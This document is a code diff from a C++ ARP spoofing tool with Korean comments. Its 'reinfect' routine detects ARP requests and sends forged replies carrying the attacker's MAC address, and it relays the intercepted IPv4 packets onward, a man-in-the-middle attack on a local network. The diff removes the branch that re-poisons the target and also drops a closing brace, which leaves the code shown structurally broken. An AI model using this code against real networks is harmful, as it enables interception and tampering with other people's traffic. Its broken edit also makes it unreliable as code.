@@ -174,21 +174,11 @@ void reinfect(pcap_t* handle, Mac attacker_mac, Ip attacker_ip, Mac sender_mac, 
             if (arp_hdr_recv->op() == htons(ArpHdr::Request) &&
                 arp_hdr_recv->sip() == sender_ip && arp_hdr_recv->tip() == target_ip) {
 
-                std::cout << "Detected ARP request from sender. Re-infecting..." << std::endl;
 
                 // 공격자의 MAC 주소를 포함한 ARP Reply 패킷을 송신자에게 전송하여 재감염 시도
                 send_arp_attack(handle, attacker_mac, attacker_ip, sender_mac, sender_ip, target_mac, target_ip);
             }
-            // 타겟이 sender의 MAC 주소를 요청하는 경우
-            else if (arp_hdr_recv->op() == htons(ArpHdr::Request) &&
-                arp_hdr_recv->sip() == target_ip && arp_hdr_recv->tip() == sender_ip) {
-
-                std::cout << "Detected ARP request from target. Re-infecting..." << std::endl;
-
-                //ARP Reply 패킷을 타겟에게 전송하여 재감염
-                send_arp_attack(handle, attacker_mac, attacker_ip, target_mac, target_ip, sender_mac, sender_ip);
-            }
-        }
+            
         else if (eth_hdr_recv->type() == htons(EthHdr::Ip4)) {
             // IP 패킷인 경우
             relay_packet(handle, recv_packet, header, attacker_mac, sender_mac, target_mac);
